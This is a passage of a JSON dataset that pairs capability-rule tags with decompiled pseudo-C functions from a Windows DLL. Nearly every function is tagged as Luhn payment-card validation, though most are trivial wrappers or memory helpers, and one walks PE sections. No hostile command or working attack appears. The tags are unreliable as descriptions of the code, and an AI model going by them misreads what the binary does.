        "decompiled_code": "\nvoid fcn.1800020b0(ulong arg1)\n\n{\n    fcn.1800026c0(arg1, 0);\n    return;\n}\n",
        "token_count": 35
    },
    "1800020d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800020d0(ulong arg1)\n\n{\n    fcn.1800027b0(arg1);\n    return;\n}\n",
        "token_count": 32
    },
    "18000210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180002100(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ushort auStackX16 [4];\n    ulong uStackX24;\n    \n    auStackX16[0] = noname_1;\n    uStackX24 = arg3;\n    fcn.180002410(arg1, auStackX16, arg3, 1);\n    return;\n}\n",
        "token_count": 89
    },
    "18000214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180002140(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ushort auStackX16 [4];\n    ulong uStackX24;\n    \n    auStackX16[0] = noname_1;\n    uStackX24 = arg3;\n    fcn.180002550(arg1, auStackX16, arg3, 1);\n    return;\n}\n",
        "token_count": 89
    },
    "18000218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180002180(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uchar auStack24 [4];\n    uint uStack20;\n    \n    uStack20 = 0;\n    fcn.180002690(arg1, auStack24);\n    fcn.1800021f0(arg2, arg1, arg3, arg4);\n    return arg2;\n}\n",
        "token_count": 90
    },
    "1800021f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800021f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong arg2_00;\n    ulong in_stack_00000028;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    arg2_00 = fcn.18000eb40(puStack32, in_stack_00000028);\n    fcn.18000b9e0(arg1, arg2_00);\n    fcn.180002710(arg1, 0, 0);\n    fcn.1800022d0(arg1, arg2, arg3, arg4);\n    return arg1;\n}\n",
        "token_count": 172
    },
    "1800022a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800022a0(ulong arg1, ulong arg2)\n\n{\n    fcn.1800022d0(arg1, arg2, 0, *0x180039ea8);\n    return;\n}\n",
        "token_count": 50
    },
    "1800022d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800022d0(int64_t arg1, int64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    uint64_t uStack24;\n    \n    uVar2 = fcn.1800020f0(arg2);\n    if (uVar2 < arg3) {\n        fcn.1800027f0(arg1);\n    }\n    iVar3 = fcn.1800020f0(arg2);\n    uStack24 = iVar3 - arg3;\n    if (arg4 < uStack24) {\n        uStack24 = arg4;\n    }\n    if (arg1 == arg2) {\n        fcn.180001fb0(arg1, arg3 + uStack24, *0x180039ea8);\n        fcn.180001fb0(arg1, 0, arg3);\n    }\n    else {\n        cVar1 = fcn.1800029c0(arg1, uStack24);\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.1800027b0(arg2);\n            arg1_00 = fcn.1800027b0(arg1);\n            fcn.1800014a0(arg1_00, iVar3 + arg3 * 2, uStack24);\n            fcn.1800026c0(arg1, uStack24);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 336
    },
    "1800023e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800023e0(ulong arg1, ulong arg2)\n\n{\n    ulong arg3;\n    \n    arg3 = fcn.180001470(arg2);\n    fcn.180002910(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 59
    },
    "18000269": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180002690(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000eb40(arg2, arg1 + 0x20);\n    return arg2;\n}\n",
        "token_count": 44
    },
    "1800026c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800026c0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    ushort auStack24 [12];\n    \n    auStack24[0] = 0;\n    *(arg1 + 0x10) = arg2;\n    iVar1 = fcn.1800027b0(arg1);\n    fcn.180001530(iVar1 + arg2 * 2, auStack24);\n    return;\n}\n",
        "token_count": 104
    },
    "18000291": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180002910(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    \n    cVar1 = fcn.180002d90(arg1, arg2);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.1800029c0(arg1, arg3);\n        if (cVar1 != '\\0') {\n            arg1_00 = fcn.1800027b0(arg1);\n            fcn.1800014a0(arg1_00, arg2, arg3);\n            fcn.1800026c0(arg1, arg3);\n        }\n    }\n    else {\n        iVar2 = fcn.1800027b0(arg1);\n        arg1 = fcn.1800022d0(arg1, arg1, arg2 - iVar2 >> 1, arg3);\n    }\n    return arg1;\n}\n",
        "token_count": 216
    },
    "180002df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180002df0(ulong arg1, ulong arg2)\n\n{\n    fcn.180002e50(arg2, 0);\n    return;\n}\n",
        "token_count": 37
    },
    "1800033a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800033a0(ulong arg1)\n\n{\n    fcn.1800034b0(arg1);\n    return;\n}\n",
        "token_count": 32
    },
    "180006a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180006a00(int64_t arg1)\n\n{\n    *(arg1 + 0x30) = 0;\n    fcn.180006980(arg1, 1, 1);\n    return;\n}\n",
        "token_count": 50
    },
    "180006a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180006a30(uint *arg1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    uint32_t uStack36;\n    \n    uVar1 = *arg1;\n    uVar2 = arg1[1];\n    iVar3 = *(arg1 + 4);\n    for (uStack36 = 0; uStack36 < (0x300 << (uVar1 + uVar2 & 0x1fU)) + 0x736U; uStack36 = uStack36 + 1) {\n        *(iVar3 + uStack36 * 2) = 0x400;\n    }\n    arg1[0x16] = 1;\n    arg1[0x15] = 1;\n    arg1[0x14] = 1;\n    arg1[0x13] = 1;\n    arg1[0x12] = 0;\n    arg1[0x19] = 0;\n    return;\n}\n",
        "token_count": 223
    },
    "18000731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007310(int64_t arg1, int64_t arg2)\n\n{\n    (**(arg2 + 8))(arg2, *(arg1 + 0x10));\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 60
    },
    "18000735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007350(int64_t arg1, int64_t arg2)\n\n{\n    (**(arg2 + 8))(arg2, *(arg1 + 0x18));\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 60
    },
    "18000739": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007390(ulong arg1, ulong arg2)\n\n{\n    fcn.180007310(arg1, arg2);\n    fcn.180007350(arg1, arg2);\n    return;\n}\n",
        "token_count": 48
    },
    "18000792": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180007920(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.180007760(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 49
    },
    "18000969": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009690(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uStack24;\n    \n    for (uStack24 = 0; uStack24 < arg4; uStack24 = uStack24 + 1) {\n        *(arg2 + uStack24) = *(arg3 + uStack24);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "1800096f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800096f0(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uStack24;\n    \n    for (uStack24 = 0; uStack24 < arg4; uStack24 = uStack24 + 1) {\n        *(arg2 + uStack24) = arg3;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "1800098a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1800098a0(uint64_t arg1, uint64_t arg2)\n\n{\n    if (arg2 > arg1) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0xd);\n    }\n    return arg2 <= arg1;\n}\n",
        "token_count": 59
    },
    "180009d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.180009d30(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t iStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint uStack48;\n    int64_t iStack40;\n    uint32_t uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    iStack40 = *arg1 + 0x18 + *(*arg1 + 0x14);\n    uVar3 = *(*arg1 + 0x30) & 0xffffffff00000000;\n    uStack72 = *(iStack40 + 8) | uVar3;\n    uStack64 = *(iStack40 + 8) & ~(*(arg1 + 0xc) - 1U);\n    uStack56 = fcn.180009b10(arg1, iStack40);\n    uStack52 = *(iStack40 + 0x24);\n    uStack48 = 0;\n    iStack80 = 1;\n    iVar1 = iStack40;\n    do {\n        iStack40 = iVar1 + 0x28;\n        if (*(*arg1 + 6) <= iStack80) {\n            uStack48 = 1;\n            iVar2 = fcn.180009b80(arg1, &uStack72);\n            return iVar2 != 0;\n        }\n        uStack24 = *(iVar1 + 0x30) | uVar3;\n        uStack16 = *(iVar1 + 0x30) & ~(*(arg1 + 0xc) - 1U);\n        uStack32 = fcn.180009b10(arg1, iStack40);\n        if ((uStack64 == uStack16) || (uStack16 < uStack72 + uStack56)) {\n            if (((*(iStack40 + 0x24) & 0x2000000) == 0) || ((uStack52 & 0x2000000) == 0)) {\n                uStack52 = (uStack52 | *(iStack40 + 0x24)) & 0xfdffffff;\n            }\n            else {\n                uStack52 = uStack52 | *(iStack40 + 0x24);\n            }\n            uStack56 = (uStack24 + uStack32) - uStack72;\n        }\n        else {\n            iVar2 = fcn.180009b80(arg1, &uStack72);\n            if (iVar2 == 0) {\n                return false;\n            }\n            uStack72 = uStack24;\n            uStack64 = uStack16;\n            uStack56 = uStack32;\n            uStack52 = *(iStack40 + 0x24);\n        }\n        iStack80 = iStack80 + 1;\n        iVar1 = iStack40;\n    } while( true );\n}\n",
        "token_count": 654
    },
    "18000a61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000a610(ulong arg1, ulong arg2)\n\n{\n    fcn.18000a670(arg1, arg2, 0x18000a500, 0x18000a540);\n    return;\n}\n",
        "token_count": 53
    },
    "18000b05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b050(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.180023b60(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 44
    },
    "18000b2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b2f0(int64_t arg1, ulong arg2)\n\n{\n    fcn.180001ef0(arg1 + 0x48, arg2);\n    fcn.180001ef0(arg1 + 0x20, arg2);\n    fcn.18000b7e0(arg1);\n    return;\n}\n",
        "token_count": 77
    },
    "18000b74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000b740(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    arg2_00 = fcn.18000eb30(puStack32);\n    fcn.18000b9e0(arg1, arg2_00);\n    fcn.1800033c0(arg1, 0, 0);\n    fcn.18000b9b0(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 144
    },
    "18000b7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b7b0(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    \n    arg2_00 = fcn.18000eb30(arg2);\n    fcn.18000ba10(arg1, arg2_00);\n    return;\n}\n",
        "token_count": 65
    },
    "18000b7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b7e0(ulong arg1)\n\n{\n    fcn.18000bbf0(arg1);\n    fcn.18000bcf0(arg1);\n    return;\n}\n",
        "token_count": 45
    },
    "18000b84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000b840(int64_t *arg1, int64_t arg2)\n\n{\n    return arg2 * 0xc + *arg1;\n}\n",
        "token_count": 39
    },
    "18000b86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000b860(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    \n    arg2_00 = fcn.18000eb30(arg2);\n    cVar2 = fcn.18001c9a0(arg1, arg2_00);\n    if (cVar2 == '\\0') {\n        if (arg1[1] == arg1[2]) {\n            fcn.18000bb60(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18000c630(arg1 + 3, arg1[1], arg2);\n        arg1[1] = arg1[1] + 0xc;\n    }\n    else {\n        iVar3 = fcn.18000eb30(arg2);\n        iVar1 = *arg1;\n        if (arg1[1] == arg1[2]) {\n            fcn.18000bb60(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18000c5f0(arg1 + 3, arg1[1], ((iVar3 - iVar1) / 0xc) * 0xc + *arg1);\n        arg1[1] = arg1[1] + 0xc;\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "18000b9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000b9e0(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000eb40(arg1 + 0x20, arg2);\n    return arg1;\n}\n",
        "token_count": 49
    },
    "18000ba1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000ba10(ulong *arg1, ulong *arg2)\n\n{\n    char cVar1;\n    ulong arg1_00;\n    ulong uVar2;\n    uchar uStack24;\n    uchar auStack23 [7];\n    ulong uStack16;\n    \n    if (arg1 != arg2) {\n        uStack16 = fcn.180002690(arg2, &uStack24);\n        arg1_00 = fcn.180002690(arg1, auStack23);\n        uVar2 = uStack16;\n        cVar1 = fcn.18000c670(arg1_00, uStack16);\n        if ((cVar1 == '\\0') || (arg2[3] < 8)) {\n            fcn.180002710(arg1, CONCAT71(uVar2 >> 8, 1), 0);\n            if (arg2[3] < 8) {\n                fcn.180001500(arg1, arg2, arg2[2] + 1);\n            }\n            else {\n                *arg1 = *arg2;\n                *arg2 = 0;\n            }\n            arg1[2] = arg2[2];\n            arg1[3] = arg2[3];\n            fcn.180002710(arg2, 0, 0);\n        }\n        else {\n            fcn.180001f20(arg1, arg2);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 315
    },
    "18000bb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000bb20(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000c6b0(arg2, arg3, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 52
    },
    "18000bb6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000bb60(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong arg2_00;\n    \n    uVar1 = fcn.18000b810(arg1);\n    iVar2 = fcn.18000bf30(arg1);\n    if (iVar2 - arg2 < uVar1) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar3 = fcn.18000bf00(arg1);\n        if (uVar3 < uVar1 + arg2) {\n            arg2_00 = fcn.18000bf50(arg1, uVar1 + arg2);\n            fcn.18000bdb0(arg1, arg2_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "18000bc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000bc90(ulong *arg1, ulong arg2)\n\n{\n    fcn.18000eb40(arg1 + 3, arg2);\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return arg1;\n}\n",
        "token_count": 72
    },
    "18000bf3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000bf30(int64_t arg1)\n\n{\n    fcn.18000c280(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 36
    },
    "18000bf5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18000bf50(ulong arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uStack40;\n    uint64_t uStack24;\n    \n    uStack24 = fcn.18000bf00(arg1);\n    iVar1 = fcn.18000bf30(arg1);\n    if (iVar1 - uStack24 / 2 < uStack24) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = uStack24 + uStack24 / 2;\n    }\n    uStack40 = uStack24;\n    if (uStack24 < arg2) {\n        uStack40 = arg2;\n    }\n    return uStack40;\n}\n",
        "token_count": 162
    },
    "18000c26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c260(ulong arg1, ulong arg2)\n\n{\n    fcn.18000c740(arg2, 0);\n    return;\n}\n",
        "token_count": 37
    },
    "18000c5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c5f0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18000c860(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 72
    },
    "18000c63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c630(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18000c830(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 70
    },
    "18000c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.18000c670(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.18000f540(arg1, arg2);\n    return cVar1 == '\\0';\n}\n",
        "token_count": 54
    },
    "18000c6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c6b0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f5c0(arg1, arg2);\n    fcn.18000c8f0(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 64
    },
    "18000c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c700(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000c940(arg2, arg3, arg4, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 57
    },
    "18000c8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c8f0(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iStackX8;\n    \n    for (iStackX8 = arg1; iStackX8 != arg2; iStackX8 = iStackX8 + 0xc) {\n        fcn.18000ca40(arg3, iStackX8);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "18000c94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000c940(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000f5c0(arg1, arg3);\n    fcn.180010200(arg1);\n    fcn.18000ca70(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 77
    },
    "18000ca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ca40(ulong arg1, ulong arg2)\n\n{\n    fcn.18000df90(arg1, arg2);\n    return;\n}\n",
        "token_count": 37
    },
    "18000ca7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000ca70(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    int64_t iStackX8;\n    int64_t iStackX24;\n    \n    iStackX24 = arg3;\n    for (iStackX8 = arg1; iStackX8 != arg2; iStackX8 = iStackX8 + 0xc) {\n        fcn.18000c5f0(arg4, iStackX24, iStackX8);\n        iStackX24 = iStackX24 + 0xc;\n    }\n    return iStackX24;\n}\n",
        "token_count": 144
    },
    "18000caf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000caf0(ulong arg1)\n\n{\n    fcn.18000cb80(arg1);\n    fcn.18000cbe0(arg1);\n    return arg1;\n}\n",
        "token_count": 44
    },
    "18000cb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cb30(ulong arg1)\n\n{\n    fcn.18000cbb0(arg1);\n    return;\n}\n",
        "token_count": 31
    },
    "18000cb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cb50(ulong arg1)\n\n{\n    fcn.18000cbe0(arg1);\n    fcn.18000cb30(arg1);\n    return;\n}\n",
        "token_count": 42
    },
    "18000cb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000cb80(ulong arg1)\n\n{\n    ulong arg3;\n    uchar uStack24;\n    uchar auStack23 [23];\n    \n    arg3 = fcn.18000eb30(&uStack24);\n    fcn.18000cc60(arg1, auStack23, arg3);\n    return arg1;\n}\n",
        "token_count": 75
    },
    "18000cbb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cbb0(ulong arg1)\n\n{\n    fcn.18000cdf0(arg1);\n    fcn.18000ce50(arg1);\n    return;\n}\n",
        "token_count": 42
    },
    "18000cbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cbe0(int64_t arg1)\n\n{\n    ulong *puVar1;\n    \n    puVar1 = fcn.18000cdd0(arg1);\n    fcn.18000cce0(arg1, *puVar1);\n    puVar1 = fcn.18000cdd0(arg1);\n    *puVar1 = *(arg1 + 8);\n    puVar1 = fcn.18000cd90(arg1);\n    *puVar1 = *(arg1 + 8);\n    puVar1 = fcn.18000cdb0(arg1);\n    *puVar1 = *(arg1 + 8);\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 160
    },
    "18000ccb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000ccb0(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000d150(arg2, *(arg1 + 8), arg1);\n    return arg2;\n}\n",
        "token_count": 47
    },
    "18000cce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cce0(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    char *pcVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    ulong uStack24;\n    \n    uStack24 = arg2;\n    while( true ) {\n        pcVar2 = fcn.18000d0e0(uStack24);\n        if (*pcVar2 != '\\0') break;\n        puVar3 = fcn.18000d100(uStack24);\n        fcn.18000cce0(arg1, *puVar3);\n        puVar3 = fcn.18000eb30(uStack24);\n        uVar1 = *puVar3;\n        uVar4 = fcn.18000d110(uStack24);\n        uVar4 = fcn.18000eb30(uVar4);\n        fcn.18000ca40(arg1 + 0x19, uVar4);\n        fcn.18000d120(arg1 + 0x18, uStack24, 1);\n        uStack24 = uVar1;\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "18000cd9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cd90(int64_t arg1)\n\n{\n    fcn.18000eb30(*(arg1 + 8));\n    return;\n}\n",
        "token_count": 35
    },
    "18000cdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cdb0(int64_t arg1)\n\n{\n    fcn.18000d100(*(arg1 + 8));\n    return;\n}\n",
        "token_count": 35
    },
    "18000cdd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000cdd0(int64_t arg1)\n\n{\n    fcn.18000d0f0(*(arg1 + 8));\n    return;\n}\n",
        "token_count": 38
    },
    "18000ce5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ce50(int64_t arg1)\n\n{\n    fcn.18000d120(arg1 + 0x18, *(arg1 + 8), 1);\n    return;\n}\n",
        "token_count": 46
    },
    "18000ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.18000ce80(int64_t *arg1, int64_t *arg2)\n\n{\n    return *arg1 == *arg2;\n}\n",
        "token_count": 35
    },
    "18000ced": {
        "rules": [
